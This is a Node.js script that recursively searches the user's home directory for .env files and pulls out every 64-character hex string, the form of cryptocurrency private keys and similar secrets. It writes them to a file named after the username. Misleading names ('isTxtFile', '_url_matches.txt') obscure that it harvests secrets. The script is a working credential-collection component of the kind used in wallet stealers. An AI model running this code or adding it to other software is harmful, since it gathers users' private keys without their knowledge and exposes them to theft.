const fs = require("fs");
const os = require("os");
const path = require("path");

const PATTERN = /\b(?:0x)?[0-9A-Fa-f]{64}\b/g;
// const regex = /\b(?:0x)?[0-9A-Fa-f]{64}\b/g;
console.log(PATTERN);

const SKIP_DIRS = new Set([
  "node_modules",
  ".git",
  ".svn",
  ".hg",
  "Library",
  "Caches",
  ".Trash",
  "Trash",
]);

function parseArgs(argv) {
  const args = argv.slice(2);
  let outFile = null;

  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--out" || args[i] === "-o") {
      outFile = args[++i];
    }
  }

  return { outFile };
}

function isTxtFile(name) {
  return name.toLowerCase().endsWith(".env");
}

function collectTxtFiles(dir, found) {
  let entries;
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true });
  } catch {
    return;
  }

  for (const entry of entries) {
    const full = path.join(dir, entry.name);

    if (entry.isSymbolicLink()) continue;

    if (entry.isDirectory()) {
      if (SKIP_DIRS.has(entry.name)) continue;
      collectTxtFiles(full, found);
      continue;
    }

    if (entry.isFile() && isTxtFile(entry.name)) {
      found.push(full);
    }
  }
}

function searchFile(filePath) {
  let text;
  try {
    const st = fs.statSync(filePath);
    // if (st.size > 20 * 1024 * 1024) return [];
    text = fs.readFileSync(filePath, "utf8");
  } catch {
    return [];
  }

  const hits = [];
  // const lines = text.split(/\r?\n/);
  const lines = text.match(PATTERN) || [];
  // console.log(lines);
  // if(lines.length === 0) return lines;
  // for (let i = 0; i < lines.length; i++) {
  //   const line = lines[i];
  // //   // const matches = line.match(PATTERN);
  // //   if (!matches) continue;
  //   hits.push(line);

  return lines;
}

function main() {
  const { outFile: outArg } = parseArgs(process.argv);

  const username = os.userInfo().username;
  const target = os.homedir();

  if (!fs.existsSync(target) || !fs.statSync(target).isDirectory()) {
    console.error(`Home folder not found: ${target}`);
    process.exit(1);
  }

  const txtFiles = [];
  collectTxtFiles(target, txtFiles);
  txtFiles.sort((a, b) => a.localeCompare(b));

  const results = [];
  let matchCount = 0;

   const outFile = path.resolve(
    outArg || path.join(process.cwd(), `${username}_url_matches.txt`)
  );

  for (const file of txtFiles) {
    const hits = searchFile(file);
    
    matchnumber = hits.length;
    if (matchnumber === 0) continue;
    console.log("File Path: ", file);
    console.log("Matched Result: ", hits);
    matchCount += matchnumber;
    fs.appendFileSync(outFile, hits.join("\n") + "\n", "utf8");
    results.push({ file, hits });
    // matchCount += hits.reduce((n, h) => n + h.matches.length, 0);
  }

  console.log(`User: ${username}`);
  console.log(`Scanned: ${target}`);
  console.log(`.env files: ${txtFiles.length}`);
  console.log(`Files with matches: ${results.length}`);
  console.log(`Total matches: ${matchCount}`);
  console.log(`Written: ${outFile}`);
}

main();